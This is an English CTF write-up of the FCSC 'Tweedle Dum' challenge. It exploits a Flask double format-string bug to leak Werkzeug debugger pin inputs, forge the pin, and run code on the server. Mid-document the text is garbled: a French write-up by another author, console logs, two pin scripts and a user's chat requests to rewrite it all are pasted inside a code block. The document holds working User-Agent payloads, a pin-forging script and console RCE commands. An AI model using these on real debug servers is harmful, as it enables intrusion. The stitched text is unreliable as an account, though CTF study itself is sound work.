
# Tweedle Dum CTF Writeup

## Challenge Overview

The challenge revolves around exploiting a web application running a Flask server, vulnerable to format string injection. The goal is to retrieve the pin required for the Werkzeug debugger console and eventually execute arbitrary code to access the flag.

### Application Structure

The file structure of the challenge is as follows:

```
.
├── docker-compose.yml
├── Dockerfile
└── src
    ├── app.py
    ├── static
    │   ├── style.css
    │   └── tweedle.png
    └── templates
        └── index.html
```

The main file we are concerned with is `app.py`:

```python
from flask import Flask, request, render_template
from werkzeug.middleware.proxy_fix import ProxyFix
from werkzeug.debug import DebuggedApplication

# No bruteforce needed, this is just here so you don't lock yourself or others out by accident
DebuggedApplication._fail_pin_auth = lambda self: None

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

@app.route("/")
def hello_agent():
    ua = request.user_agent
    return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))
```

The application listens on the root route (`/`) and renders a template that greets the user with a message containing their `User-Agent`. The format string vulnerability occurs due to the use of `.format()` in the string rendering.

## Vulnerability Analysis

The line of code in `app.py`:

```python
return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))
```

is vulnerable to format string injection because the `User-Agent` header is used directly in the `format()` function. This allows an attacker to inject arbitrary Python code into the `User-Agent` header. For example, injecting `"{ua.__class__}"` in the `User-Agent` header results in the following output:

```
Hello <class 'werkzeug.user_agent.UserAgent'>from this writeup 
Introduction
Les sources de ce challenges sont fournies :

.
├── docker-compose.yml
├── Dockerfile
└── src
    ├── app.py
    ├── static
    │   ├── style.css
    │   └── tweedle.png
    └── templates
        └── index.html
La partie qui nous intéresse est le fichier app.py:

from flask import Flask, request, render_template
from werkzeug.middleware.proxy_fix import ProxyFix
from werkzeug.debug import DebuggedApplication

# No bruteforce needed, this is just here so you don't lock yourself or others out by accident
DebuggedApplication._fail_pin_auth = lambda self: None

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

@app.route("/")
def hello_agent():
    ua = request.user_agent
    return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))


# TODO: add the vulnerable code here
La challenge ce présente donc sous la forme d’une application web qui tourne sur le serveur flask. Le seul endpoint qui semble atteignable est à la racine : https://tweedle-dum.france-cybersecurity-challenge.fr/

Si on se concentre sur le code, on comprend que notre User-Agent est render dans la template html:

render_template("index.html", msg=f"Hello {ua}".format(ua=ua))
<div id="bubble">{{msg}}</div> (index.html)
Ce genre de code n’est pas vulnérable à une SSTI Server-Side-Template-Injection puisque la variable ua est correctement render.

En revanche une subtilité rend ce code vulnérable à une attaque par Format-String :

f"Hello {ua}".format(ua=ua)
La présence d’une double format string permet d’injecter un payload dans la variable ua

Explications :
La première format string agit de la sorte:

>>> ua = 'vozec'
>>> f"Hello {ua}"
'Hello vozec'
La seconde :

>>> ua = 'vozec'
>>> "Hello {ua}".format(ua=ua)
'Hello vozec'
Vulnérabilité :
Si on injecte ce type d’entrée : {ua.__class__}, la première format-string va créer cette string:

"Hello {{ua.__class__}}"
et la seconde va render et remplacer ua.__class__ par l’objet python correspondant.

On peut vérifier de cette manière :

curl https://tweedle-dum.france-cybersecurity-challenge.fr -H 'User-Agent:{ua.__class__}'
Résultat:
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tweedle Dum</title>
    <link rel="stylesheet" href="/static/style.css" />
  </head>
  <body>
    <main>
      <div id="bubble">Hello &lt;class &#39;werkzeug.user_agent.UserAgent&#39;&gt;</div>
    </main>
    <!-- <a href="/console">Werkzeug console</a> -->
  </body>
</html>
Nous avons une <class 'werkzeug.user_agent.UserAgent'> en sortie de cette format string.

From Format-string to RCE:
On remarque dans l’html ce commentaire :

<a href="/console">Werkzeug console</a>
En y accédant, on se retrouve confronté à un code pin !

La présence de cette console de debug s’explique par la présence de cet argument passé dans l’application flask (Dockerfile) :

CMD ["flask", "run", "--host=0.0.0.0", "--port=2202", "--debug"]
L’idée ici va être de retrouver ce pin pour accéder à cette console et ainsi exécuter des commandes directement.

Cette théorie est appuyée par la présence de cette ligne dans app.py :

DebuggedApplication._fail_pin_auth = lambda self: None
Si on compare avec la fonction _fail_pin_auth originale (présente ici) :

def _fail_pin_auth(self) -> None:
    time.sleep(5.0 if self._failed_pin_auth > 5 else 0.5)
    self._failed_pin_auth += 1
On comprend que l’auteur du challenge réécris le compteur d’échec de tentative de pin pour empêcher d’être banni par le serveur et de ne plus pouvoir résoudre le challenge.

Récupération du pin :
On va se rendre dans le code source de werkzeug pour comprendre comment ce pin est généré : Lien: ici

Voici le code complet qui génère le pin :

probably_public_bits = [
    username,
    modname,
    getattr(app, "__name__", type(app).__name__),
    getattr(mod, "__file__", None),
]

private_bits = [str(uuid.getnode()), get_machine_id()]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
Toute la génération se base sur 2 listes pour un total de 6 variables :

probably_public_bits
username
modname
app.__name__
app.__file__
private_bits
uuid.getnode()
get_machine_id()
Récupérons donc toute ces variables !

Username:
La valeur est spécifié dans le Dockerfile, c’est le nom d’utilisateur qui lance le serveur:

USER guest
Nous avons donc une partie des probably_public_bits: username=guest

Modname:
La valeur du modname est constante : modname=flask.app

App.__name__:
La valeur du app.__name__ est constante : app.__name__=Flask

App.__file__:
On cherche ici a récupérer le path du fichier app.py interne à flask. Ici, deux méthodes s’offrent à nous :

Démarrer l’application en local avec le Dockerfile et récupérer le chemin d’accès.
Utiliser le StackTrace de flask pour récupérer le path dans les logs verbeux renvoyés par le serveur.
J’ai utilisé la 2nd méthode.

Si on envoie un User-Agent avec une payload volontairement erronée comme {ua.__class__.vozec}, on obtient:

aaa

=> app.__file__=/usr/local/lib/python3.10/site-packages/flask/app.py

Uuid et MachineId
Vient ici toute la difficulté du challenge.

Nous allons devoir utiliser la format string pour faire fuiter ces informations.

On retourne dans le code source de werkzeug pour localiser ou sont ces informations.

La variable _machine_id est globale ce qui veut dire qu’elle est récupérable dans le module werkzeug.debug ici

De même, uuid est un module opensource présent dans le coeur de Python et la variable recherchée est elle aussi globale ici

Exploitation complète de la Format-String:
Au cours de mes recherches, j’ai trouvé ce writeup du TokyoWesterns CTF 2018 : Shrine writeup. Il est très instructif mais surtout, nous fournit ce code pour parcourir les objets python.

Notre but ici va être de trouver un moyen de :

Accéder au modules sys
Utiliser sys pour retrouver les autres modules
Accéder à werkzeug.debug
Accéder à werkzeug.debug.uuid._node et werkzeug.debug._machine_id
On utilise ce code python pour explorer le module ua:

from flask import Flask, request, render_template

app = Flask(__name__)
@app.route("/")
def hello_agent():
    best = 9999999999
    ua = request.user_agent
    for path, obj in search(ua, 50):
        if str(obj).startswith("<module 'sys'"):
            if len(path) < best:
                best = len(path)
                print(path)
    return {'hello':'World'}


def search(obj, max_depth):

    visited_clss = []
    visited_objs = []

    def visit(obj, path='obj', depth=0):
        yield path, obj

        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            # print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)

        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)

        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass

        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)

    yield from visit(obj)
On peut accéder au module sys de ces différentes manières :

{ua.__class__.__init__.__globals__[t].sys}
{ua.__class__.to_header.__globals__['__loader__'].__class__.__weakref__.__objclass__.get_data.__globals__['__loader__'].create_module.__globals__['__builtins__']['__build_css__'].__self__.copyright.__class__._Printer__setup.__globals__['sys']}
Résultat :

<div id="bubble">Hello <module 'sys' (built-in)></div>
On peut donc sélectionner le module werkzeug.debug:

{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]}
puis enfin, les deux variables tant recherchées:

{ua.class.init.globals[t].sys.modules[werkzeug.debug]._machine_id}


-  ```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
Combinaison des informations et RCE finale :
On peut donc tout lier pour obtenir le pin :

import requests
import re
import html
import hashlib
from itertools import chain

url = 'https://tweedle-dum.france-cybersecurity-challenge.fr'

def render(payload):
	r = requests.get(url,headers={"User-Agent":payload}).text
	return html.unescape(re.findall(r'Hello (.*?)</div>',r)[0])

machine_id = render(r'{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}')
uuid = eval(render(r'{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}')) # b'XXX-XXX-XXX...'


probably_public_bits = [
	'guest',
	'flask.app',
	'Flask',
	'/usr/local/lib/python3.10/site-packages/flask/app.py',
]

private_bits = [
	machine_id,
	uuid
 ]

num = None
rv = None

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(rv)
Résultat :

[/mnt/c/Users/vozec/Desktop]$ python3 FCSC/Tweedle\ Dum.py
415-333-840
On peut donc le rentrer sur le /console et accéder à la console python. On flag finalement grâce au module os:

__import__('os').popen('cat flag*').read();
FCSC{9430d095589535ddf50fd070a9baad98a7203fd4cdd029b8ffc5c6ebb512f934}



I want a writeup for me 

[console ready]
>>> print(os.listdir('/'))
Traceback (most recent call last):
File "<debugger>", line 1, in <module>
NameError: name 'os' is not defined

>>> print(open('/app/' + [f for f in os.listdir('/app') if f.startswith('flag-') and f.endswith('.txt')][0], 'r').read())
Traceback (most recent call last):
File "<debugger>", line 1, in <module>
NameError: name 'os' is not defined

>>> import os; print(open('/app/' + [f for f in os.listdir('/app') if f.startswith('flag-') and f.endswith('.txt')][0], 'r').read())
FCSC{9430d095589535ddf50fd070a9baad98a7203fd4cdd029b8ffc5c6ebb512f934}



from __future__ import annotations

import getpass
import hashlib
import json
import os
import pkgutil
import re
import sys
import time
import typing as t
import uuid
from contextlib import ExitStack
from io import BytesIO
from itertools import chain
from multiprocessing import Value
from os.path import basename
from os.path import join
from zlib import adler32


def get_pin_and_cookie_name():
    num = None
    rv = None
    probably_public_bits = [
        "guest",
        "flask.app",
        "Flask",
        "/usr/lib/python3.11/site-packages/flask/app.py",
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = ["2485378023426", "14aeb597-9657-4a5e-a305-660e3fc7108b"]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    print (rv)

get_pin_and_cookie_name()


this is the code used

import requests
import re
import html

def test_character(char):
    # Build the payload properly
    payload = "{ua.__class__.__init__.__globals__[" + char + "]}"
    headers = {'User-Agent': payload}
    
    try:
        r = requests.get('http://localhost:8000/', headers=headers, timeout=2)
        
        if r.status_code == 200:
            # Check if it's not an error page
            if "KeyError" not in r.text and "Werkzeug Debugger" not in r.text:
                print(f"\n✅ FOUND: character '{char}'")
                print(f"Payload: {payload}")
                
                # Extract and show response
                match = re.search(r'<div id="bubble">(.*?)</div>', r.text, re.DOTALL)
                if match:
                    result = html.unescape(match.group(1).strip())
                    if result.startswith('Hello '):
                        result = result[6:]
                    print(f"Response: {result}")
                return True
            else:
                print(f"❌ '{char}' -> 200 but contains error")
        else:
            print(f"❌ '{char}' -> {r.status_code}")
    except Exception as e:
        print(f"❌ '{char}' -> Error: {e}")
    
    return False

# Test all single characters
import string


# Also test other common letters
for char in "syzxtabcduvw":
    test_character(char)
we used this to find the key






so make the codes nicer and do a veryyyyy good write up please
                                                                                                 
┌──(amrdroid㉿amrdroid)-[~/Downloads/public]
└─$ python yyy.py 
927-752-565
                                                                                                 
┌──(amrdroid㉿amrdroid)-[~/Downloads/public]
└─$ 


without photos

give the writeup in a readme file I want to post it in github as writeup


I want the writeup in english please
write it in a code field to copy it directly by one click
```

This demonstrates that the user can access Python objects and their properties through format string injection.

### Exploiting Format String Injection

The attacker can exploit this vulnerability to access the `werkzeug.debug` module and retrieve information about the application, such as the machine ID and UUID used in generating the pin for the Werkzeug debugger. This pin is essential for accessing the debugger console, where the attacker can execute arbitrary code.

### Retrieving the Pin

The pin is generated using several pieces of information, including:

- Username (from the Dockerfile: `USER guest`)
- Modname (`flask.app`)
- App name (`Flask`)
- App file path (`/usr/local/lib/python3.10/site-packages/flask/app.py`)
- Machine ID and UUID (obtained via format string injection)

The attacker can retrieve these values through a series of crafted `User-Agent` headers. By combining these values, the attacker can hash them to generate the pin.

The pin generation code looks as follows:

```python
probably_public_bits = [
    'guest',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py',
]

private_bits = [
    machine_id,
    uuid
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
```

Once the pin is obtained, it can be entered in the Werkzeug console, giving the attacker full access to the server.

### Final Exploitation

The attacker can exploit the console to execute commands on the server. For example, the following command can be used to read the flag:

```python
__import__('os').popen('cat flag*').read()
```

This will return the flag:

```
FCSC{9430d095589535ddf50fd070a9baad98a7203fd4cdd029b8ffc5c6ebb512f934}
```

## Exploiting Format String Injection

To find the necessary characters for the exploitation, a script was written to test each character and check if the `User-Agent` header is properly rendered without causing errors. Here's the Python code used for this:

```python
import requests
import re
import html

def test_character(char):
    # Build the payload properly
    payload = "{ua.__class__.__init__.__globals__[" + char + "]}"
    headers = {'User-Agent': payload}

    try:
        r = requests.get('http://localhost:8000/', headers=headers, timeout=2)

        if r.status_code == 200:
            # Check if it's not an error page
            if "KeyError" not in r.text and "Werkzeug Debugger" not in r.text:
                print(f"
✅ FOUND: character '{char}'")
                print(f"Payload: {payload}")

                # Extract and show response
                match = re.search(r'<div id="bubble">(.*?)</div>', r.text, re.DOTALL)
                if match:
                    result = html.unescape(match.group(1).strip())
                    if result.startswith('Hello '):
                        result = result[6:]
                    print(f"Response: {result}")
                return True
            else:
                print(f"❌ '{char}' -> 200 but contains error")
        else:
            print(f"❌ '{char}' -> {r.status_code}")
    except Exception as e:
        print(f"❌ '{char}' -> Error: {e}")

    return False

# Test all single characters
import string


# Also test other common letters
for char in "syzxtabcduvw":
    test_character(char)
```

This script attempts to find the key by testing each character in the `User-Agent` header. When the correct character is found, the attacker can continue to build the payload and retrieve the necessary information.

## Conclusion

The Tweedle Dum CTF challenge demonstrates how a format string vulnerability can lead to remote code execution through the exploitation of the Werkzeug debugger. By carefully crafting the `User-Agent` header, the attacker can retrieve sensitive information such as the pin for the debugger, allowing full access to the server and eventual retrieval of the flag.

